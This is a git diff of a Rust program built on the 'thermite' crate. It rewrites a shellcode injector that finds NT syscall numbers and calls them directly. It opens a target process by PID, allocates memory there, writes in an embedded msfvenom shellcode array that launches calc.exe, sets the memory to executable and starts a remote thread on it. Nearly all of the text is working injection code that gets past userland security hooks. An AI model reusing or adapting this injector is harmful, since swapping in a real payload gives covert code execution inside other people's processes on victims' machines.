@@ -1,52 +1,44 @@
 use thermite::dll_parser::Export;
 use std::{mem, process};
+use std::ffi::c_void;
+use std::ptr::null;
 use thermite::model::windows::peb_teb::UNICODE_STRING;
 use thermite::model::windows::nt_status::NtStatus;
-use thermite::syscalls::Syscall;
-
-
-// 1 - Defining the data types and structures we will need
-//
-pub enum CVoid {}
-pub type Handle = isize;
-// pub type PHandle = *mut Handle;
-pub type Pvoid = *mut CVoid;
-pub type DWord = u32;
 
 // Don't forget #[repr(C)] !
+
 #[repr(C)]
 #[derive(Clone, Debug)]
 pub struct ObjectAttributes {
     length: u32,
-    root_directory: Handle,
+    root_directory: isize,//Handle,
     object_name: *const UNICODE_STRING,
     attributes: u32,
-    security_descriptor: *const CVoid,
-    security_quality_of_service: *const CVoid,
+    security_descriptor: *const c_void,//CVoid,
+    security_quality_of_service: *const c_void,
 }
 
 #[repr(C)]
 #[derive(Debug)]
 pub struct ClientId {
-    pub unique_process: Handle,
-    pub unique_thread: Handle,
+    pub unique_process: isize,
+    pub unique_thread: isize,
 }
 
-// Some constants i copy pasted straight from windows libs
-const SYNCHRONIZE: DWord = 0x00100000u32;
-const STANDARD_RIGHTS_REQUIRED: DWord = 0x00100000u32;
-const PROCESS_ALL_ACCESS: DWord = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFFu32;
-const MEM_RESERVE: DWord = 0x2000;
-const MEM_COMMIT: DWord = 0x1000;
-const PAGE_READWRITE: DWord = 0x04;
-const PAGE_EXECUTE_READ: DWord = 0x20;
-const PAGE_EXECUTE_READWRITE: DWord = 0x40;
-const GENERIC_ALL: DWord = 0x10000000;
-const GENERIC_EXECUTE: DWord = 0x20000000;
-const GENERIC_WRITE: DWord = 0x40000000;
-const GENERIC_READ: DWord = 0x80000000;
-const THREAD_ALL_ACCESS: DWord = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
 
+// Some useful constants
+// lifted straight from windows libs
+const SYNCHRONIZE: u32 = 0x00100000u32;
+const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
+const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
+const MEM_RESERVE: u32 = 0x2000;
+const MEM_COMMIT: u32 = 0x1000;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
+const GENERIC_EXECUTE: u32 = 0x20000000;
+
+
+// Basic meterpreter shellcode, just spawns calc.exe
 // msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
 const POP_CALC: [u8; 276] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
@@ -90,104 +82,104 @@ fn handle_status(str: &str, x: i32) {
     }
 }
 
+/// Function that returns true only for the syscalls we will need
+/// Made to be passed to thermite::syscalls::search to filter NTDLL Exports
 fn filter(x: &&Export) -> bool {
     ["NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
         "NtProtectVirtualMemory", "NtWaitForSingleObject", "NtClose", "NtCreateThreadEx"].contains(&x.name.as_str())
 }
 
-
-// This function simply read the process environment to recover the PID passed in arguments
-fn read_pid() -> u32 {
-    let args: Vec<String> = std::env::args().collect();
-    if args.len() < 2 {
-        eprintln!("Usage: syscalls-shellcode <PID>");
-        std::process::exit(-1);
-    }
-    let pid: u32 = args[1].parse().unwrap_or_else(|_| {
-        eprintln!("[TwT] PID isn't a valid integer");
-        std::process::exit(-1);
-    });
-    println!("[?-?] Target process ID {pid}");
-    pid
+/// Read the PID from the program's command line arguments
+/// If nothing is found or if the argument cannot be parsed, returns None
+/// Else returns Some(pid)
+fn read_pid() -> Option<u32> {
+    let args: Vec<String> = std::env::args().collect::<Vec<String>>();
+    if args.len() > 1 {
+        let pid: u32 = args[1].parse().ok()?;
+        println!("[?-?] Target process ID {pid}");
+        Some(pid)
+    } else { None }
 }
 
-//////////////////////////////////////////////////////////////
-//
-// The function below demonstrate how to inject a shellcode
-// in a remote memory's address space, then execute it by
-// creating a thread in the remote process
-//
-////////////
-fn inject() {
-    let tmp_vec = unsafe {
-        thermite::syscalls::search(
-            filter as fn(&&Export)->bool,
-            thermite::syscalls::simple_get_ssn,
-        )
-    }.unwrap();
 
+///
+/// The function below demonstrate how to execute a shellcode
+/// either locally, in our own processe's memory or by
+/// injecting it in a remote process.
+///
+/// It takes a PID as argument, if the pid is 0, the shellcode will be executed locally
+/// Else it will be injected in the target process
+///
+fn exec(pid: u32) {
+    // Looking up the syscalls we need
+    let tmp_vec = thermite::syscalls::search(
+        filter as fn(&&Export)->bool,
+        thermite::syscalls::simple_get_ssn,
+    ).unwrap(); // Not clean, but does the work
+    
     let syscalls: std::collections::HashMap<&str, u16> = tmp_vec
         .iter()
         .map(|syscall| (syscall.name.as_str(), syscall.clone().ssn))
         .collect();
     println!("Syscalls found : {:#x?}", syscalls);
 
-
-
-    // Even more boring stuff
-    // Define the structures we need
+    // Declaring structures we're going to use later
+    let mut thread_handle: isize = 0;
     let oa_process: ObjectAttributes = ObjectAttributes {
-        length: std::mem::size_of::<ObjectAttributes>() as _,
+        length: mem::size_of::<ObjectAttributes>() as _,
         root_directory: 0u32 as _,
         object_name: 0u32 as _,
         attributes: 0,
         security_descriptor: 0u32 as _,
         security_quality_of_service: 0u32 as _,
     };
+    // let oa_thread = oa_process.clone(); // Unused 
 
-    let mut oa_thread = oa_process.clone();
+    // This is "pseudo Handle", a sort of handle constant
+    // The value -1 means it's a handle to our own process
+    let mut process_handle: isize = -1;
 
-    let client_id = ClientId {
-        unique_process: read_pid() as _,
-        unique_thread: 0 as _,
-    };
-
-    let mut process_handle: Handle = 0u32 as _;
-    let mut thread_handle: Handle = 0u32 as _;
-    let mut base_addr: Pvoid = 0u32 as _;
-
-    // First syscall, the moment of truth
-    // Get a handle to the target process
-    unsafe {
-        let x = thermite::syscalls::syscall_handler(
-            syscalls["NtOpenProcess"].clone(),
-            0x4,
-            &mut process_handle,
-            PROCESS_ALL_ACCESS,
-            // PROCESS_VM_WRITE | PROCESS_VM_READ,
-            &oa_process,
-            &client_id,
-        );
-        handle_status("NtOpenProcess", x);
+    // But if we have a target PID,
+    // we go get a real handle to the target process
+    // Else w'll  just continue with the pseudo handle
+    if pid.ne(&0) {
+        let client_id = ClientId {
+            unique_process: pid as _,
+            unique_thread: 0 as _,
+        };
+        unsafe {
+            let x = thermite::syscalls::syscall_handler(
+                syscalls["NtOpenProcess"].clone(),
+                0x4,
+                &mut process_handle,
+                PROCESS_ALL_ACCESS,
+                // PROCESS_VM_WRITE | PROCESS_VM_READ,
+                &oa_process,
+                &client_id,
+            );
+            handle_status("NtOpenProcess", x);
+        }
+        println!("Process Handle: {:#x?}", process_handle);
     }
-    // println!("Process Handle: {:#x?}", process_handle);
-
-    // Allocate some memory region in the target process for our shellcode
+    
     let mut buf_size: usize = POP_CALC.len();
+    let mut base_addr: *mut c_void = 0u32 as _;
+
+    // First we allocate some memory for our shellcode
     unsafe {
         let x = thermite::syscalls::syscall_handler(
             syscalls["NtAllocateVirtualMemory"].clone(),
             0x6,
-            process_handle,             // [in]      HANDLE    ProcessHandle,
-            &mut base_addr,             // [in, out] PVOID     *BaseAddress,
-            0u32,                       // [in]      ULONG_PTR ZeroBits,
-            &mut buf_size,              // [in, out] PSIZE_T   RegionSize,
-            MEM_COMMIT | MEM_RESERVE,   // [in]      ULONG     AllocationType,
-            PAGE_READWRITE              // [in]      ULONG     Protect
+            process_handle,                     // [in]      HANDLE    ProcessHandle,
+            &mut base_addr,                     // [in, out] PVOID     *BaseAddress,
+            0u32,                               // [in]      ULONG_PTR ZeroBits,
+            &mut buf_size,                      // [in, out] PSIZE_T   RegionSize,
+            MEM_COMMIT | MEM_RESERVE,           // [in]      ULONG     AllocationType,
+            PAGE_READWRITE                      // [in]      ULONG     Protect
         );
         handle_status("NtAllocateVirtualMemory", x);
-    }
-    println!("[^-^] Allocated {} bytes of memory", buf_size);
+    };
+    println!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");
 
     // Copy the shellcode to newly allocated memory
     let mut bytes_written: usize = 0;
@@ -203,56 +195,57 @@ fn inject() {
         );
         handle_status("NtWriteVirtualMemory", x);
     }
-    println!("[^-^] Successfully written {} bytes in remote memory", buf_size);
+    println!("[^-^] Successfully written {buf_size} bytes in remote memory");
 
     // Change protection status of allocated memory to READ+EXECUTE
+    let mut bytes_written = POP_CALC.len();
+    let mut old_protec = PAGE_READWRITE;
     unsafe {
         let x = thermite::syscalls::syscall_handler(
             syscalls["NtProtectVirtualMemory"].clone(),
             0x6,
             process_handle,             // [in]              HANDLE    ProcessHandle,
             &mut base_addr,             // [in, out]         PVOID     *BaseAddress,
-            &mut bytes_written,              // [in, out]         PULONG    NumberOfBytesToProtect,
+            &mut bytes_written,         // [in, out]         PULONG    NumberOfBytesToProtect,
             PAGE_EXECUTE_READ,          // [in]              ULONG     NewAccessProtection,
-            &mut PAGE_READWRITE         // [out]             PULONG    OldAccessProtection  ,
+            &mut old_protec             // [out]             PULONG    OldAccessProtection  ,
         );
         handle_status("NtProtectVirtualMemory", x);
-    }
+    };
 
     // Create a remote thread in target process
     unsafe {
-        // FIXME: Why does it return STATUS_NO_MEMORY?
         let x = thermite::syscalls::syscall_handler(
             syscalls["NtCreateThreadEx"].clone(),
             0xb,
-            &mut thread_handle,   // [out]   PHANDLE                 hThread,
-            GENERIC_ALL,      // [in]    ACCESS_MASK             DesiredAccess,
-            // 0 as Pvoid,
-            &oa_thread,           // [in]    LPVOID                  ObjectAttributes,
-            process_handle,       // [in]    HANDLE                  ProcessHandle,
-            &base_addr,           // [in]    LPTHREAD_START_ROUTINE  lpStartAddress,
-            0 as Pvoid,                   // [in]    LPVOID                  lpParameter,
-            0,                    // [in]    BOOL                    CreateSuspended,
-            0,                    // [in]    ULONG                   StackZeroBits,
-            0,                    // [in]    ULONG                   SizeOfStackCommit,
-            0,                    // [in]    ULONG                   SizeOfStackReserve,
-            0 as Pvoid,                    // [out]   LPVOID                  lpBytesBuffer,
+            &mut thread_handle,
+            GENERIC_EXECUTE,
+            null::<*mut c_void>(),//&mut oa_thread,
+            process_handle,
+            base_addr,
+            base_addr,
+            0i32,
+            null::<*mut c_void>(),
+            null::<*mut c_void>(),
+            null::<*mut c_void>(),
+            null::<*mut c_void>()
         );
         handle_status("NtCreateThreadEx", x);
     }
 
     // Wait for the thread to execute
+    // Timeout is a null pointer, so we wait indefinitely
     unsafe {
         let x = thermite::syscalls::syscall_handler(
             syscalls["NtWaitForSingleObject"].clone(),
             0x3,
-            thread_handle,      //  [in] HANDLE         Handle,
-            0,                  //  [in] BOOLEAN        Alertable,
-            &(0u64),            //  [in] PLARGE_INTEGER Timeout
+            thread_handle,                  //  [in] HANDLE         Handle,
+            0,                              //  [in] BOOLEAN        Alertable,
+            null::<*mut c_void>(),          //  [in] PLARGE_INTEGER Timeout
 
         );
         handle_status("NtWaitForSingleObject", x);
-    }
+    };
 
     // Close the handle
     unsafe {
@@ -262,54 +255,10 @@ fn inject() {
             thread_handle,      //  [in] HANDLE         Handle,
         );
         handle_status("NtClose", x);
-    }
+    };
 }
 
-
-
-
-
-//////////////////////////////////////////////////////////////
-//
-// The function below demonstrate how to execute a shellcode
-// Locally, in our own processe's memory.
-// It is a bit simpler to understand than the injection and
-// can be useful to understand more advanced techniques.
-//
-////////////
-fn exec() {
-    let tmp_vec = unsafe {
-        thermite::syscalls::search(
-            filter as fn(&&Export)->bool,
-            thermite::syscalls::simple_get_ssn,
-        )
-    }.unwrap();
-    let syscalls: std::collections::HashMap<&str, u16> = tmp_vec
-        .iter()
-        .map(|syscall| (syscall.name.as_str(), syscall.clone().ssn))
-        .collect();
-    println!("Syscalls found : {:#x?}", syscalls);
-
-
-    // Allocate some memory region in memory for our shellcode
-    let mut buf_size: usize = POP_CALC.len();
-    unsafe {
-        let x = thermite::syscalls::syscall_handler(
-            syscalls["NtAllocateVirtualMemory"].clone(),
-            0x6,
-            // process_handle,             // [in]      HANDLE    ProcessHandle,
-            // &mut base_addr,             // [in, out] PVOID     *BaseAddress,
-            // 0u32,                       // [in]      ULONG_PTR ZeroBits,
-            // &mut buf_size,              // [in, out] PSIZE_T   RegionSize,
-            // MEM_COMMIT | MEM_RESERVE,   // [in]      ULONG     AllocationType,
-            // PAGE_READWRITE              // [in]      ULONG     Protect
-        );
-        handle_status("NtAllocateVirtualMemory", x);
-    }
-    println!("[^-^] Allocated {} bytes of memory", buf_size);
-}
 
 fn main() {
-    inject()
-    // exec()
+    exec(read_pid().unwrap_or(0));
 }
